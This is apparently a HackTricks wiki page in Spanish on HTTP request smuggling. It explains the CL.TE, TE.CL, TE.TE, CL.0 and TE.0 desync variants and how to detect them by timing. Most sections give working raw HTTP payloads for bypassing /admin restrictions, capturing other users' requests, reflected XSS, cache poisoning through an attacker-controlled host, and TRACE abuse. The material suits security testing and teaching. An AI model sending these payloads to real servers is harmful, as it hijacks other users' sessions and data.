# HTTP Request Smuggling / HTTP Desync Attack

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.

</details>
{% endhint %}

## Qu√© es

Esta vulnerabilidad ocurre cuando una **desincronizaci√≥n** entre los **proxies de front-end** y el servidor **back-end** permite a un **atacante** **enviar** una **solicitud** HTTP que ser√° **interpretada** como una **solicitud √∫nica** por los proxies de **front-end** (balanceador de carga/proxy inverso) y **como 2 solicitudes** por el servidor **back-end**.\
Esto permite a un usuario **modificar la siguiente solicitud que llega al servidor back-end despu√©s de la suya**.

### Teor√≠a

[**Especificaci√≥n RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Si se recibe un mensaje con un campo de encabezado Transfer-Encoding y un campo de encabezado Content-Length, este √∫ltimo DEBE ser ignorado.

**Content-Length**

> El encabezado de entidad Content-Length indica el tama√±o del cuerpo de la entidad, en bytes, enviado al destinatario.

**Transfer-Encoding: chunked**

> El encabezado Transfer-Encoding especifica la forma de codificaci√≥n utilizada para transferir de manera segura el cuerpo de la carga √∫til al usuario.\
> Chunked significa que los datos grandes se env√≠an en una serie de fragmentos.

### Realidad

El **Front-End** (un balanceador de carga / Proxy Inverso) **procesa** el encabezado _**content-length**_ o el _**transfer-encoding**_ y el servidor **Back-end** **procesa el otro** provocando una **desincronizaci√≥n** entre los 2 sistemas.\
Esto podr√≠a ser muy cr√≠tico ya que **un atacante podr√° enviar una solicitud** al proxy inverso que ser√° **interpretada** por el servidor **back-end** **como 2 solicitudes diferentes**. El **peligro** de esta t√©cnica reside en el hecho de que el servidor **back-end** **interpretar√°** la **2¬™ solicitud inyectada** como si **viniera del siguiente cliente** y la **solicitud real** de ese cliente ser√° **parte** de la **solicitud inyectada**.

### Particularidades

Recuerda que en HTTP **un car√°cter de nueva l√≠nea est√° compuesto por 2 bytes:**

* **Content-Length**: Este encabezado utiliza un **n√∫mero decimal** para indicar el **n√∫mero** de **bytes** del **cuerpo** de la solicitud. Se espera que el cuerpo termine en el √∫ltimo car√°cter, **no se necesita una nueva l√≠nea al final de la solicitud**.
* **Transfer-Encoding:** Este encabezado utiliza en el **cuerpo** un **n√∫mero hexadecimal** para indicar el **n√∫mero** de **bytes** del **siguiente fragmento**. El **fragmento** debe **terminar** con una **nueva l√≠nea** pero esta nueva l√≠nea **no se cuenta** en el indicador de longitud. Este m√©todo de transferencia debe terminar con un **fragmento de tama√±o 0 seguido de 2 nuevas l√≠neas**: `0`
* **Connection**: Basado en mi experiencia, se recomienda usar **`Connection: keep-alive`** en la primera solicitud del HTTP Request Smuggling.

## Ejemplos B√°sicos

{% hint style="success" %}
Al intentar explotar esto con Burp Suite **desactiva `Update Content-Length` y `Normalize HTTP/1 line endings`** en el repetidor porque algunos gadgets abusan de nuevas l√≠neas, retornos de carro y content-lengths malformados.
{% endhint %}

Los ataques de HTTP request smuggling se elaboran enviando solicitudes ambiguas que explotan discrepancias en c√≥mo los servidores de front-end y back-end interpretan los encabezados `Content-Length` (CL) y `Transfer-Encoding` (TE). Estos ataques pueden manifestarse en diferentes formas, principalmente como **CL.TE**, **TE.CL** y **TE.TE**. Cada tipo representa una combinaci√≥n √∫nica de c√≥mo los servidores de front-end y back-end priorizan estos encabezados. Las vulnerabilidades surgen de que los servidores procesan la misma solicitud de diferentes maneras, lo que lleva a resultados inesperados y potencialmente maliciosos.

### Ejemplos B√°sicos de Tipos de Vulnerabilidad

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

{% hint style="info" %}
A la tabla anterior deber√≠as agregar la t√©cnica TE.0, como la t√©cnica CL.0 pero usando Transfer Encoding.
{% endhint %}

#### Vulnerabilidad CL.TE (Content-Length usado por Front-End, Transfer-Encoding usado por Back-End)

* **Front-End (CL):** Procesa la solicitud basada en el encabezado `Content-Length`.
* **Back-End (TE):** Procesa la solicitud basada en el encabezado `Transfer-Encoding`.
* **Escenario de Ataque:**
* El atacante env√≠a una solicitud donde el valor del encabezado `Content-Length` no coincide con la longitud real del contenido.
* El servidor de front-end reenv√≠a toda la solicitud al back-end, basado en el valor de `Content-Length`.
* El servidor back-end procesa la solicitud como fragmentada debido al encabezado `Transfer-Encoding: chunked`, interpretando los datos restantes como una solicitud separada y subsiguiente.
*   **Ejemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### Vulnerabilidad TE.CL (Transfer-Encoding usado por Front-End, Content-Length usado por Back-End)

* **Front-End (TE):** Procesa la solicitud basada en el encabezado `Transfer-Encoding`.
* **Back-End (CL):** Procesa la solicitud basada en el encabezado `Content-Length`.
* **Escenario de Ataque:**
* El atacante env√≠a una solicitud fragmentada donde el tama√±o del fragmento (`7b`) y la longitud real del contenido (`Content-Length: 4`) no se alinean.
* El servidor de front-end, respetando `Transfer-Encoding`, reenv√≠a toda la solicitud al back-end.
* El servidor back-end, respetando `Content-Length`, procesa solo la parte inicial de la solicitud (`7b` bytes), dejando el resto como parte de una solicitud subsiguiente no intencionada.
*   **Ejemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### Vulnerabilidad TE.TE (Transfer-Encoding usado por ambos, con ofuscaci√≥n)

* **Servidores:** Ambos soportan `Transfer-Encoding`, pero uno puede ser enga√±ado para ignorarlo a trav√©s de ofuscaci√≥n.
* **Escenario de Ataque:**
* El atacante env√≠a una solicitud con encabezados `Transfer-Encoding` ofuscados.
* Dependiendo de qu√© servidor (front-end o back-end) no reconozca la ofuscaci√≥n, se puede explotar una vulnerabilidad CL.TE o TE.CL.
* La parte no procesada de la solicitud, tal como la ve uno de los servidores, se convierte en parte de una solicitud subsiguiente, llevando al smuggling.
*   **Ejemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **Escenario CL.CL (Content-Length usado por ambos Front-End y Back-End)**

* Ambos servidores procesan la solicitud bas√°ndose √∫nicamente en el encabezado `Content-Length`.
* Este escenario t√≠picamente no conduce a smuggling, ya que hay alineaci√≥n en c√≥mo ambos servidores interpretan la longitud de la solicitud.
*   **Ejemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Solicitud Normal
```

#### **Escenario CL.0**

* Se refiere a escenarios donde el encabezado `Content-Length` est√° presente y tiene un valor diferente de cero, indicando que el cuerpo de la solicitud tiene contenido. El back-end ignora el encabezado `Content-Length` (que se trata como 0), pero el front-end lo analiza.
* Es crucial para entender y elaborar ataques de smuggling, ya que influye en c√≥mo los servidores determinan el final de una solicitud.
*   **Ejemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Cuerpo No Vac√≠o
```

#### Escenario TE.0

* Similar al anterior pero usando TE.
* T√©cnica [reportada aqu√≠](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
* **Ejemplo**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### Rompiendo el servidor web

Esta t√©cnica tambi√©n es √∫til en escenarios donde es posible **romper un servidor web mientras se lee los datos HTTP iniciales** pero **sin cerrar la conexi√≥n**. De esta manera, el **cuerpo** de la solicitud HTTP ser√° considerado la **siguiente solicitud HTTP**.

Por ejemplo, como se explica en [**este art√≠culo**](https://mizu.re/post/twisty-python), en Werkzeug era posible enviar algunos caracteres **Unicode** y esto har√≠a que el servidor **se rompiera**. Sin embargo, si la conexi√≥n HTTP se cre√≥ con el encabezado **`Connection: keep-alive`**, el cuerpo de la solicitud no ser√° le√≠do y la conexi√≥n seguir√° abierta, por lo que el **cuerpo** de la solicitud ser√° tratado como la **siguiente solicitud HTTP**.

#### Forzando a trav√©s de encabezados hop-by-hop

Abusando de los encabezados hop-by-hop, podr√≠as indicar al proxy que **elimine el encabezado Content-Length o Transfer-Encoding para que un HTTP request smuggling sea posible de abusar**.
```
Connection: Content-Length
```
Para **m√°s informaci√≥n sobre los encabezados hop-by-hop** visita:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Encontrando HTTP Request Smuggling

Identificar vulnerabilidades de HTTP request smuggling a menudo se puede lograr utilizando t√©cnicas de temporizaci√≥n, que se basan en observar cu√°nto tiempo tarda el servidor en responder a solicitudes manipuladas. Estas t√©cnicas son particularmente √∫tiles para detectar vulnerabilidades CL.TE y TE.CL. Adem√°s de estos m√©todos, hay otras estrategias y herramientas que se pueden utilizar para encontrar tales vulnerabilidades:

### Encontrando Vulnerabilidades CL.TE Usando T√©cnicas de Temporizaci√≥n

* **M√©todo:**
* Env√≠a una solicitud que, si la aplicaci√≥n es vulnerable, har√° que el servidor de back-end espere datos adicionales.
*   **Ejemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **Observaci√≥n:**
* El servidor de front-end procesa la solicitud en funci√≥n de `Content-Length` y corta el mensaje prematuramente.
* El servidor de back-end, esperando un mensaje en trozos, espera el siguiente trozo que nunca llega, causando un retraso.
* **Indicadores:**
* Timeouts o largos retrasos en la respuesta.
* Recibir un error 400 Bad Request del servidor de back-end, a veces con informaci√≥n detallada del servidor.

### Encontrando Vulnerabilidades TE.CL Usando T√©cnicas de Temporizaci√≥n

* **M√©todo:**
* Env√≠a una solicitud que, si la aplicaci√≥n es vulnerable, har√° que el servidor de back-end espere datos adicionales.
*   **Ejemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **Observaci√≥n:**
* El servidor de front-end procesa la solicitud en funci√≥n de `Transfer-Encoding` y reenv√≠a todo el mensaje.
* El servidor de back-end, esperando un mensaje basado en `Content-Length`, espera datos adicionales que nunca llegan, causando un retraso.

### Otros M√©todos para Encontrar Vulnerabilidades

* **An√°lisis de Respuesta Diferencial:**
* Env√≠a versiones ligeramente variadas de una solicitud y observa si las respuestas del servidor difieren de manera inesperada, indicando una discrepancia de an√°lisis.
* **Uso de Herramientas Automatizadas:**
* Herramientas como la extensi√≥n 'HTTP Request Smuggler' de Burp Suite pueden probar autom√°ticamente estas vulnerabilidades enviando varias formas de solicitudes ambiguas y analizando las respuestas.
* **Pruebas de Variaci√≥n de Content-Length:**
* Env√≠a solicitudes con valores de `Content-Length` variables que no est√°n alineados con la longitud real del contenido y observa c√≥mo maneja el servidor tales desajustes.
* **Pruebas de Variaci√≥n de Transfer-Encoding:**
* Env√≠a solicitudes con encabezados de `Transfer-Encoding` ofuscados o malformados y monitorea c√≥mo responden de manera diferente los servidores de front-end y back-end a tales manipulaciones.

### Pruebas de Vulnerabilidad de HTTP Request Smuggling

Despu√©s de confirmar la efectividad de las t√©cnicas de temporizaci√≥n, es crucial verificar si se pueden manipular las solicitudes del cliente. Un m√©todo sencillo es intentar envenenar tus solicitudes, por ejemplo, haciendo que una solicitud a `/` produzca una respuesta 404. Los ejemplos de `CL.TE` y `TE.CL` discutidos anteriormente en [Ejemplos B√°sicos](./#basic-examples) demuestran c√≥mo envenenar la solicitud de un cliente para provocar una respuesta 404, a pesar de que el cliente intenta acceder a un recurso diferente.

**Consideraciones Clave**

Al probar vulnerabilidades de request smuggling interfiriendo con otras solicitudes, ten en cuenta:

* **Conexiones de Red Distintas:** Las solicitudes "atacantes" y "normales" deben enviarse a trav√©s de conexiones de red separadas. Utilizar la misma conexi√≥n para ambas no valida la presencia de la vulnerabilidad.
* **URL y Par√°metros Consistentes:** Intenta usar URLs y nombres de par√°metros id√©nticos para ambas solicitudes. Las aplicaciones modernas a menudo dirigen las solicitudes a servidores de back-end espec√≠ficos seg√∫n la URL y los par√°metros. Hacer coincidir estos aumenta la probabilidad de que ambas solicitudes sean procesadas por el mismo servidor, un requisito previo para un ataque exitoso.
* **Condiciones de Temporizaci√≥n y Carrera:** La solicitud "normal", destinada a detectar interferencias de la solicitud "atacante", compite contra otras solicitudes concurrentes de la aplicaci√≥n. Por lo tanto, env√≠a la solicitud "normal" inmediatamente despu√©s de la solicitud "atacante". Las aplicaciones ocupadas pueden requerir m√∫ltiples intentos para una confirmaci√≥n concluyente de vulnerabilidad.
* **Desaf√≠os de Balanceo de Carga:** Los servidores de front-end que act√∫an como balanceadores de carga pueden distribuir solicitudes entre varios sistemas de back-end. Si las solicitudes "atacantes" y "normales" terminan en diferentes sistemas, el ataque no tendr√° √©xito. Este aspecto de balanceo de carga puede requerir varios intentos para confirmar una vulnerabilidad.
* **Impacto No Intencionado en el Usuario:** Si tu ataque impacta inadvertidamente la solicitud de otro usuario (no la solicitud "normal" que enviaste para la detecci√≥n), esto indica que tu ataque influy√≥ en otro usuario de la aplicaci√≥n. Las pruebas continuas podr√≠an interrumpir a otros usuarios, lo que requiere un enfoque cauteloso.

## Abusando de HTTP Request Smuggling

### Eludir la Seguridad del Front-End a trav√©s de HTTP Request Smuggling

A veces, los proxies de front-end imponen medidas de seguridad, examinando las solicitudes entrantes. Sin embargo, estas medidas pueden ser eludidas al explotar HTTP Request Smuggling, permitiendo el acceso no autorizado a puntos finales restringidos. Por ejemplo, acceder a `/admin` podr√≠a estar prohibido externamente, con el proxy de front-end bloqueando activamente tales intentos. No obstante, este proxy puede descuidar inspeccionar las solicitudes incrustadas dentro de una solicitud HTTP contrabandeada, dejando un vac√≠o para eludir estas restricciones.

Considera los siguientes ejemplos que ilustran c√≥mo HTTP Request Smuggling puede ser utilizado para eludir los controles de seguridad del front-end, espec√≠ficamente apuntando a la ruta `/admin` que generalmente est√° protegida por el proxy de front-end:

**Ejemplo CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
En el ataque CL.TE, se aprovecha el encabezado `Content-Length` para la solicitud inicial, mientras que la solicitud embebida subsiguiente utiliza el encabezado `Transfer-Encoding: chunked`. El proxy de front-end procesa la solicitud `POST` inicial pero no inspecciona la solicitud embebida `GET /admin`, lo que permite el acceso no autorizado a la ruta `/admin`.

**Ejemplo TE.CL**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Por el contrario, en el ataque TE.CL, la solicitud `POST` inicial utiliza `Transfer-Encoding: chunked`, y la solicitud embebida subsiguiente se procesa en funci√≥n del encabezado `Content-Length`. Similar al ataque CL.TE, el proxy de front-end pasa por alto la solicitud `GET /admin` contrabandeada, otorgando inadvertidamente acceso a la ruta restringida `/admin`.

### Revelando la reescritura de solicitudes en el front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Las aplicaciones a menudo emplean un **servidor de front-end** para modificar las solicitudes entrantes antes de pasarlas al servidor de back-end. Una modificaci√≥n t√≠pica implica agregar encabezados, como `X-Forwarded-For: <IP del cliente>`, para transmitir la IP del cliente al back-end. Comprender estas modificaciones puede ser crucial, ya que podr√≠a revelar formas de **eludir protecciones** o **descubrir informaci√≥n o puntos finales ocultos**.

Para investigar c√≥mo un proxy altera una solicitud, localiza un par√°metro POST que el back-end ecoe en la respuesta. Luego, elabora una solicitud, utilizando este par√°metro al final, similar a lo siguiente:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
En esta estructura, los componentes de la solicitud subsiguiente se a√±aden despu√©s de `search=`, que es el par√°metro reflejado en la respuesta. Esta reflexi√≥n expondr√° los encabezados de la solicitud subsiguiente.

Es importante alinear el encabezado `Content-Length` de la solicitud anidada con la longitud real del contenido. Se aconseja comenzar con un valor peque√±o e incrementar gradualmente, ya que un valor demasiado bajo truncar√° los datos reflejados, mientras que un valor demasiado alto puede causar que la solicitud falle.

Esta t√©cnica tambi√©n es aplicable en el contexto de una vulnerabilidad TE.CL, pero la solicitud debe terminar con `search=\r\n0`. Independientemente de los caracteres de nueva l√≠nea, los valores se a√±adir√°n al par√°metro de b√∫squeda.

Este m√©todo sirve principalmente para entender las modificaciones de la solicitud realizadas por el proxy del front-end, realizando esencialmente una investigaci√≥n autodirigida.

### Capturando las solicitudes de otros usuarios <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Es factible capturar las solicitudes del siguiente usuario a√±adiendo una solicitud espec√≠fica como el valor de un par√°metro durante una operaci√≥n POST. Aqu√≠ se explica c√≥mo se puede lograr:

Al a√±adir la siguiente solicitud como el valor de un par√°metro, puedes almacenar la solicitud del cliente subsiguiente:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
En este escenario, el **par√°metro de comentario** est√° destinado a almacenar el contenido dentro de la secci√≥n de comentarios de una publicaci√≥n en una p√°gina de acceso p√∫blico. En consecuencia, el contenido de la solicitud subsiguiente aparecer√° como un comentario.

Sin embargo, esta t√©cnica tiene limitaciones. Generalmente, captura datos solo hasta el delimitador de par√°metro utilizado en la solicitud contrabandeada. Para env√≠os de formularios codificados en URL, este delimitador es el car√°cter `&`. Esto significa que el contenido capturado de la solicitud del usuario v√≠ctima se detendr√° en el primer `&`, que incluso puede ser parte de la cadena de consulta.

Adem√°s, vale la pena se√±alar que este enfoque tambi√©n es viable con una vulnerabilidad TE.CL. En tales casos, la solicitud debe concluir con `search=\r\n0`. Independientemente de los caracteres de nueva l√≠nea, los valores se agregar√°n al par√°metro de b√∫squeda.

### Usando el contrabando de solicitudes HTTP para explotar XSS reflejado

El contrabando de solicitudes HTTP se puede aprovechar para explotar p√°ginas web vulnerables a **XSS Reflejado**, ofreciendo ventajas significativas:

* La interacci√≥n con los usuarios objetivo **no es necesaria**.
* Permite la explotaci√≥n de XSS en partes de la solicitud que son **normalmente inalcanzables**, como los encabezados de solicitudes HTTP.

En escenarios donde un sitio web es susceptible a XSS Reflejado a trav√©s del encabezado User-Agent, la siguiente carga √∫til demuestra c√≥mo explotar esta vulnerabilidad:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Este payload est√° estructurado para explotar la vulnerabilidad mediante:

1. Iniciando una solicitud `POST`, aparentemente t√≠pica, con un encabezado `Transfer-Encoding: chunked` para indicar el inicio del smuggling.
2. Siguiendo con un `0`, marcando el final del cuerpo del mensaje en chunks.
3. Luego, se introduce una solicitud `GET` smuggled, donde el encabezado `User-Agent` se inyecta con un script, `<script>alert(1)</script>`, activando el XSS cuando el servidor procesa esta solicitud subsiguiente.

Al manipular el `User-Agent` a trav√©s del smuggling, el payload elude las restricciones normales de la solicitud, explotando as√≠ la vulnerabilidad de XSS Reflejado de una manera no est√°ndar pero efectiva.

#### HTTP/0.9

{% hint style="danger" %}
En caso de que el contenido del usuario se refleje en una respuesta con un **`Content-type`** como **`text/plain`**, impidiendo la ejecuci√≥n del XSS. ¬°Si el servidor soporta **HTTP/0.9 podr√≠a ser posible eludir esto**!
{% endhint %}

La versi√≥n HTTP/0.9 fue anterior a la 1.0 y solo utiliza verbos **GET** y **no** responde con **encabezados**, solo el cuerpo.

En [**este writeup**](https://mizu.re/post/twisty-python), esto fue abusado con un smuggling de solicitudes y un **punto final vulnerable que responder√° con la entrada del usuario** para smuggling una solicitud con HTTP/0.9. El par√°metro que se reflejar√° en la respuesta conten√≠a una **respuesta HTTP/1.1 falsa (con encabezados y cuerpo)**, por lo que la respuesta contendr√° c√≥digo JS ejecutable v√°lido con un `Content-Type` de `text/html`.

### Explotando redirecciones en el sitio con HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Las aplicaciones a menudo redirigen de una URL a otra utilizando el nombre de host del encabezado `Host` en la URL de redirecci√≥n. Esto es com√∫n en servidores web como Apache e IIS. Por ejemplo, solicitar una carpeta sin una barra diagonal al final resulta en una redirecci√≥n para incluir la barra:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Resultados en:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Aunque aparentemente inofensivo, este comportamiento puede ser manipulado utilizando HTTP request smuggling para redirigir a los usuarios a un sitio externo. Por ejemplo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Esta solicitud encubierta podr√≠a hacer que la siguiente solicitud de usuario procesada sea redirigida a un sitio web controlado por un atacante:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Resultados en:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
En este escenario, se secuestra la solicitud de un usuario para un archivo JavaScript. El atacante puede comprometer potencialmente al usuario sirviendo JavaScript malicioso en respuesta.

### Explotando la contaminaci√≥n de cach√© web a trav√©s de HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

La contaminaci√≥n de cach√© web puede ejecutarse si cualquier componente de la **infraestructura de front-end almacena contenido en cach√©**, t√≠picamente para mejorar el rendimiento. Al manipular la respuesta del servidor, es posible **contaminar la cach√©**.

Anteriormente, observamos c√≥mo se pod√≠an alterar las respuestas del servidor para devolver un error 404 (consulte [Ejemplos B√°sicos](./#basic-examples)). De manera similar, es factible enga√±ar al servidor para que entregue contenido de `/index.html` en respuesta a una solicitud de `/static/include.js`. En consecuencia, el contenido de `/static/include.js` se reemplaza en la cach√© con el de `/index.html`, haciendo que `/static/include.js` sea inaccesible para los usuarios, lo que potencialmente puede llevar a una Denegaci√≥n de Servicio (DoS).

Esta t√©cnica se vuelve particularmente potente si se descubre una **vulnerabilidad de Redirecci√≥n Abierta** o si hay una **redirecci√≥n en el sitio a una redirecci√≥n abierta**. Tales vulnerabilidades pueden ser explotadas para reemplazar el contenido en cach√© de `/static/include.js` con un script bajo el control del atacante, habilitando esencialmente un ataque de Cross-Site Scripting (XSS) generalizado contra todos los clientes que soliciten el `/static/include.js` actualizado.

A continuaci√≥n se muestra una ilustraci√≥n de la explotaci√≥n de **contaminaci√≥n de cach√© combinada con una redirecci√≥n en el sitio a una redirecci√≥n abierta**. El objetivo es alterar el contenido de la cach√© de `/static/include.js` para servir c√≥digo JavaScript controlado por el atacante:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Note el request incrustado que apunta a `/post/next?postId=3`. Este request ser√° redirigido a `/post?postId=4`, utilizando el **valor del encabezado Host** para determinar el dominio. Al alterar el **encabezado Host**, el atacante puede redirigir el request a su dominio (**redirecci√≥n en el sitio a redirecci√≥n abierta**).

Despu√©s de un exitoso **envenenamiento de socket**, se debe iniciar un **request GET** para `/static/include.js`. Este request ser√° contaminado por el anterior request de **redirecci√≥n en el sitio a redirecci√≥n abierta** y obtendr√° el contenido del script controlado por el atacante.

Posteriormente, cualquier request para `/static/include.js` servir√° el contenido en cach√© del script del atacante, lanzando efectivamente un amplio ataque XSS.

### Usando el HTTP request smuggling para realizar enga√±o de cach√© web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **¬øCu√°l es la diferencia entre el envenenamiento de cach√© web y el enga√±o de cach√© web?**
>
> * En **el envenenamiento de cach√© web**, el atacante provoca que la aplicaci√≥n almacene contenido malicioso en la cach√©, y este contenido se sirve desde la cach√© a otros usuarios de la aplicaci√≥n.
> * En **el enga√±o de cach√© web**, el atacante provoca que la aplicaci√≥n almacene contenido sensible perteneciente a otro usuario en la cach√©, y luego el atacante recupera este contenido de la cach√©.

El atacante elabora un request smuggled que obtiene contenido sensible espec√≠fico del usuario. Considere el siguiente ejemplo:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Si esta solicitud contrabandeada envenena una entrada de cach√© destinada a contenido est√°tico (por ejemplo, `/someimage.png`), los datos sensibles de la v√≠ctima de `/private/messages` podr√≠an ser almacenados en cach√© bajo la entrada de cach√© del contenido est√°tico. En consecuencia, el atacante podr√≠a potencialmente recuperar estos datos sensibles almacenados en cach√©.

### Abusando de TRACE a trav√©s de HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**En esta publicaci√≥n**](https://portswigger.net/research/trace-desync-attack) se sugiere que si el servidor tiene habilitado el m√©todo TRACE, podr√≠a ser posible abusar de √©l con un HTTP Request Smuggling. Esto se debe a que este m√©todo reflejar√° cualquier encabezado enviado al servidor como parte del cuerpo de la respuesta. Por ejemplo:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Enviar√© una respuesta como:
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Un ejemplo de c√≥mo abusar de este comportamiento ser√≠a **contrabandear primero una solicitud HEAD**. Esta solicitud ser√° respondida solo con los **encabezados** de una solicitud GET (**`Content-Type`** entre ellos). Y contrabandear **inmediatamente despu√©s de la HEAD una solicitud TRACE**, que estar√° **reflejando los datos enviados**.\
Como la respuesta HEAD contendr√° un encabezado `Content-Length`, la **respuesta de la solicitud TRACE ser√° tratada como el cuerpo de la respuesta HEAD, reflejando as√≠ datos arbitrarios** en la respuesta.\
Esta respuesta se enviar√° a la siguiente solicitud a trav√©s de la conexi√≥n, por lo que esto podr√≠a ser **utilizado en un archivo JS en cach√©, por ejemplo, para inyectar c√≥digo JS arbitrario**.

